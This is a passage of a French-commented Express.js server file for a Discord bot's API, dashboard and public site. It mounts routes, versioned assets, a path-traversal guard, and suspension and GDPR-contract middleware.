    // avec ses placeholders bruts, et protège aussi les pages ajoutées plus tard.
    app.use((req, res, next) => {
        if (req.method !== 'GET' && req.method !== 'HEAD') return next();
        if (!req.path.endsWith('.html')) return next();
        const filePath = path.join(PUBLIC_DIR, path.normalize(req.path));
        // Traversée de chemin : tout ce qui sort de public/ est refusé au rendu.
        if (!filePath.startsWith(PUBLIC_DIR + path.sep) || !fs.existsSync(filePath)) return next();
        return vnctDs.send(res, filePath, vitrineContext(mode));
    });

    // index:false pour ne pas court-circuiter la route '/' ci-dessus. Les pages
    // HTML sont déjà interceptées par le garde-fou : ici on ne sert que les
    // assets propres à la vitrine (images, favicon…).
    app.use(express.static(PUBLIC_DIR, { index: false }));
}

// ═══════════════════════════════════════════════════════════════
//  Dashboard — modes `bot` et `public`
// ═══════════════════════════════════════════════════════════════

function mountDashboard(app) {
    // Fichiers porteurs de références versionnées : la version y est injectée à la
    // volée depuis package.json (voir services/assetVersion.js). Doit passer AVANT
    // express.static, sinon le fichier brut avec ses __VERSION__ est servi tel quel.
    const VERSIONED_FILES = {
        '/dashboard/index.html': path.join(DASHBOARD_DIR, 'index.html'),
        '/dashboard/app.html': path.join(DASHBOARD_DIR, 'app.html'),
        '/dashboard/sw.js': path.join(DASHBOARD_DIR, 'sw.js'),
    };
    for (const [route, filePath] of Object.entries(VERSIONED_FILES)) {
        app.get(route, (req, res) => assetVersion.send(res, filePath));
    }

    // /dashboard et /dashboard/ tombaient sur express.static, qui servait
    // index.html brut avec ses __VERSION__ non substitués : seul le chemin
    // complet /dashboard/index.html passait par assetVersion. On sert
    // explicitement la page de connexion versionnée sur les trois formes.
    app.get(['/dashboard', '/dashboard/'], (req, res) => {
        assetVersion.send(res, path.join(DASHBOARD_DIR, 'index.html'));
    });

    // Fichiers statiques du dashboard (ETag + no-cache pour les assets mutables).
    // index:false : les pages HTML ne doivent jamais sortir d'ici, elles passent
    // toutes par assetVersion.
    app.use('/dashboard', express.static(DASHBOARD_DIR, {
        index: false,
        etag: true,
        lastModified: true,
        setHeaders(res, filePath) {
            if (filePath.match(/\.(html|js|css)$/)) {
                res.setHeader('Cache-Control', 'no-cache');
            } else if (filePath.match(/\.(png|jpg|jpeg|gif|ico|svg|woff2?|ttf|eot)$/)) {
                res.setHeader('Cache-Control', 'public, max-age=604800');
            }
        }
    }));
}

// ═══════════════════════════════════════════════════════════════
//  Applications
// ═══════════════════════════════════════════════════════════════

/**
 * App complète : bot + API + dashboard.
 *
 * ⚠️ Reçoit l'ADAPTATEUR de plateforme (DA §4), pas le client natif. C'est le
 * point de bascule du lot 7 : les routes lisent le client REST normalisé
 * (`adaptateur.api`) et les capacités déclarées, jamais `client.guilds.cache`.
 * Le client natif reste accessible par `adaptateur.client`, et `api/` ne s'en
 * sert plus que par `api/services/plateforme.js`, où chaque lecture restante
 * est marquée et comptée.
 *
 * @param {object} adaptateur adaptateur de plateforme. Un objet vide est
 *        accepté : c'est ce que passent les tests qui montent l'API sans bot,
 *        et toutes les routes le traitent comme « bot non connecté ».
 * @param {'bot'|'public'} mode — en `public`, '/' sert la vitrine et la page de
 *        connexion du dashboard reste accessible sur /dashboard.
 */
function createApi(adaptateur, mode = 'bot') {
    // Les routes sont requises ici, et non en tête de module : leur chargement
    // tire toute la chaîne bot/BDD (better-sqlite3, discord.js). Le mode `site`
    // monte une app qui n'en a aucun besoin — il ne doit pas la payer au simple
    // require('./api').
    const authRoutes = require('./routes/auth');
    const botRoutes = require('./routes/bot');
    const guildRoutes = require('./routes/guilds');
    const moderationRoutes = require('./routes/moderation');
    const welcomeRoutes = require('./routes/welcome');
    const reactionrolesRoutes = require('./routes/reactionroles');
    const embedsRoutes = require('./routes/embeds');
    const customcmdsRoutes = require('./routes/customcmds');
    const tempvoiceRoutes = require('./routes/tempvoice');
    const ticketsRoutes = require('./routes/tickets');
    const presenceRoutes = require('./routes/presence');
    const updateRoutes = require('./routes/update');
    // Lecture du journal des nouveautés par le dashboard (pop-up de mise à jour).
    const nouveautesRoutes = require('./routes/nouveautes');
    const scheduledRoutes = require('./routes/scheduled');
    const instanceRoutes = require('./routes/instance');
    // Lot 2 conformité RGPD — mêmes contraintes de chargement paresseux : ces
    // routes et l'utilitaire de suspension tirent la chaîne bot/BDD.
    const contractRoutes = require('./routes/contract');
    const breachRoutes = require('./routes/breach');
    const ownerRoutes = require('./routes/owner');
    const erasureRoutes = require('./routes/erasure');
    // Require paresseux, comme les autres du lot : le middleware tire
    // services/contract, qui tire services/database.
    const { requireContract } = require('./middleware/requireContract');
    // Modération automatique — quatre modules qui partagent le socle commun
    // (punitions composables, portée par règle, salon d'arbitrage).
    const automodRoutes = require('./routes/automod');
    const warnEscalationRoutes = require('./routes/warnEscalation');
    const antiraidRoutes = require('./routes/antiraid');
    const honeypotRoutes = require('./routes/honeypot');
    const deferRoutes = require('./routes/defer');
    const plateformeRoutes = require('./routes/plateforme');
    const { isSuspended } = require('../bot/utils/suspension');

    const app = express();

    appliquerTrustProxy(app);
    // En-têtes avant tout le reste : une réponse d'erreur précoce doit les
    // porter aussi.
    mountSecurityHeaders(app);
    // La version d'Express n'apprend rien d'utile à une visiteuse, et beaucoup
    // à qui cherche une faille connue.
    app.disable('x-powered-by');

    // Middleware
    mountBodyParsers(app);
    app.use(cookieParser());

    // Rendre l'adaptateur accessible aux routes. Une seule clé : les routes
    // passent par api/services/plateforme.js, qui sait la lire.
    app.set('plateforme', adaptateur || null);

    mountNoStore(app);
    mountFeedbackRelay(app);

    // API routes
    app.use('/auth', authRoutes);
    app.use('/api/bot', botRoutes);
    // Capacités de la plateforme active. Montée tôt et sans garde d'accès : la
    // page de connexion la lit avant d'avoir le moindre jeton.
    app.use('/api', plateformeRoutes);

    // Enforcement de la suspension (coupure ciblée, sous-lot E) : refuse toute
    // ÉCRITURE de configuration sur un serveur suspendu par la propriétaire.
    // Monté AVANT TOUS les routers guild-scoped — y compris guildRoutes, qui porte
    // PUT /:guildId/modules et PUT /:guildId/settings — pour les couvrir tous, avec
    // leurs sous-routes internes. La liste GET /api/guilds n'a pas de segment
    // :guildId : elle n'est jamais interceptée. Les demandes de suppression (droit
    // des personnes, obligation légale) NE sont PAS bloquées par une suspension :
    // seule la configuration l'est.
    app.use('/api/guilds/:guildId', (req, res, next) => {
        const isErasure = req.path.includes('/erasure');
        if (!isErasure && ['POST', 'PUT', 'DELETE', 'PATCH'].includes(req.method) && isSuspended(req.params.guildId)) {
            return res.status(403).json({ error: 'Serveur suspendu par la proprietaire : configuration en lecture seule.' });
        }
        next();
    });

    // Article 28.3 du RGPD : l'acceptation du contrat de sous-traitance est
    // imposée par le SERVEUR, plus seulement par le navigateur. Jusqu'ici
    // `hasAcceptedCurrent()` n'avait qu'un seul appelant, la route que le front
    // consulte : un administrateur qui refusait le contrat, ou n'importe quel
    // script muni d'un jeton, configurait et lisait tout par l'API directe. Le
    // contrat et la politique de confidentialité affirmaient un blocage qui
    // n'existait pas techniquement.
    //
    // Même position et même exemption que le garde-fou de suspension juste
    // au-dessus : devant tous les routeurs guild-scoped, et jamais devant
    // /erasure — une obligation légale ne se suspend pas parce qu'un contrat
    // n'est pas signé. Les deux gardes sont volontairement voisines pour que
    // leurs exemptions se lisent ensemble.
    app.use('/api/guilds/:guildId', requireContract);

    app.use('/api/guilds', guildRoutes);
    app.use('/api/guilds/:guildId/moderation', moderationRoutes);
    app.use('/api/guilds/:guildId/welcome', welcomeRoutes);
    app.use('/api/guilds/:guildId/reactionroles', reactionrolesRoutes);
    app.use('/api/guilds/:guildId/embeds', embedsRoutes);
    app.use('/api/guilds/:guildId/customcmds', customcmdsRoutes);
    app.use('/api/guilds/:guildId/tempvoice', tempvoiceRoutes);
    app.use('/api/guilds/:guildId/tickets', ticketsRoutes);
    app.use('/api/guilds/:guildId/scheduled', scheduledRoutes);
    app.use('/api/guilds/:guildId/erasure', erasureRoutes);
    // Montés après le garde-fou de suspension ci-dessus, comme tous les routeurs
    // guild-scoped : une écriture de configuration reste refusée sur un serveur
    // suspendu, sans que chaque module ait à y penser.
    app.use('/api/guilds/:guildId/automod', automodRoutes);
    app.use('/api/guilds/:guildId/warn-escalation', warnEscalationRoutes);
    app.use('/api/guilds/:guildId/antiraid', antiraidRoutes);
    app.use('/api/guilds/:guildId/honeypot', honeypotRoutes);
    app.use('/api/guilds/:guildId/defer', deferRoutes);
    app.use('/api/presence', presenceRoutes);
    app.use('/api/contract', contractRoutes);
    app.use('/api/breach', breachRoutes);
    app.use('/api/owner', ownerRoutes);
    app.use('/api', updateRoutes);
    // Route d'INSTANCE, pas de serveur : montée sur /api comme update.js, elle
    // ne porte aucun segment :guildId. `vitrineMounted` lui dit si la page
    // publique /nouveautes existe ici — elle n'est servie qu'en mode `public`,
    // et le pop-up ne doit pas proposer un lien qui finirait en 404 sur une
    // instance auto-hébergée.
    app.set('vitrineMounted', mode === 'public');
    app.use('/api', nouveautesRoutes);
    app.use('/api', instanceRoutes);

    mountDashboard(app);

    // Redirect /callback vers auth
    app.get('/callback', (req, res) => {
        // Passer à la route auth
        const url = `/auth/callback?${new URLSearchParams(req.query)}`;
        res.redirect(url);
    });

    if (mode === 'public') {
        // Instance publique : la vitrine prend la racine, le dashboard vit sous
        // /dashboard (déjà monté ci-dessus).
        mountVitrine(app, mode);
    } else {
        // Auto-hébergement : '/' est la page de connexion du dashboard, la
        // vitrine n'est pas servie du tout.
        app.get('/', (req, res) => {
            assetVersion.send(res, path.join(DASHBOARD_DIR, 'index.html'));
        });
    }

    // DERNIER de la chaîne, sans exception : Express ne transmet une erreur
    // qu'aux middlewares déclarés APRÈS la route qui l'a produite. Monté plus
    // haut, il ne verrait rien.
    app.use(errorHandler);

    return app;
}

/**
 * App vitrine seule (mode `site`) : ni bot, ni base, ni dashboard. Sert la
 * vitrine sur '/' et répond une page « bientôt de retour » sur les URLs du
 * dashboard, qui existent dans la nature (liens, favoris, moteurs de recherche).
 */
function createSiteApi(mode) {
    const app = express();

    appliquerTrustProxy(app);
    mountSecurityHeaders(app);
    app.disable('x-powered-by');

    mountBodyParsers(app);
    mountNoStore(app);

    // Seule route d'API conservée : le relais de signalement, dont le FAB de la
    // vitrine se sert en repli quand Sema est injoignable. Il ne dépend ni du
    // bot ni de la base — la retirer dégraderait la vitrine telle qu'elle tourne
    // aujourd'hui.
    mountFeedbackRelay(app);

    const SOON_PAGE = path.join(PUBLIC_DIR, 'instance-bientot.html');
    app.use(['/dashboard', '/auth'], (req, res) => {
        // 503 et non 404 : la ressource existe, elle est temporairement fermée.
        // vnctDs.send conserve le statut déjà posé sur la réponse.
        res.status(503);
        vnctDs.send(res, SOON_PAGE, vitrineContext(mode));
    });

    mountVitrine(app, mode);

    // Même filet sur la vitrine : elle rend des pages via le design system
    // distant, dont l'indisponibilité ne doit pas produire une pile d'appel
    // affichée au public.
    app.use(errorHandler);

    return app;
}

module.exports = { construireCsp, resoudreTrustProxy, cleClient, createApi, createSiteApi };
